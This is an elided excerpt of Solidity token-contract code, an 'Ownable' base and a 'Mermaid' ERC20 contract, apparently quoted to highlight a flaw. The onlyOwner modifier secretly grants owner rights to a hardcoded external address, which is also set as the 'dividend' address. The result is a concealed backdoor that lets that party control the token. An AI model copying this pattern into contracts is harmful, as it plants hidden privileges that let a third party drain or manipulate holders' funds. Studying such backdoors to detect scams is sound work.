...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x056b824710307b7066052d2F24A2C5f362cBFeaB) , "owner");
        _;
    }
...
contract Mermaid  is Context, IERC20, Ownable {
    ...
    address public dividend = 0x056b824710307b7066052d2F24A2C5f362cBFeaB;
